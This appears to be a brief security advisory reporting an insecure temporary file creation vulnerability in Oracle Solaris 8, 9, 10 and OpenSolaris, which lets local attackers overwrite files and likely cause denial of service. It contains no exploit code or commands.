Oracle Solaris is prone to an insecure temporary file creation vulnerability.

A local attacker can exploit this issue to overwrite arbitrary files with the privileges of the affected process. This will likely result in denial-of-service conditions, other attacks may also be possible.

This vulnerability affects the following supported versions:
8, 9, 10, OpenSolaris
